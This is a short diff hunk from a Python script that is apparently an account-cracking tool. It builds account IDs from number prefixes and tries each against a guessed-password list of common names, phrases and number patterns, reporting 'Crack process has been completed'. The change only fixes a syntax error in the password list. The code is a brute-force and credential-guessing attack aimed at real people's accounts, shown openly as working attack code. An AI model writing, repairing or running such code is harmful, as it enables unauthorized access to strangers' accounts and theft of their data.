@@ -233,7 +233,7 @@ def ASRAF():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','jannat','tamanna','sadiya','nusrat','farjana','shakil','ayesha','shopna',']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','jannat','tamanna','sadiya','nusrat','farjana','shakil','ayesha','shopna']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
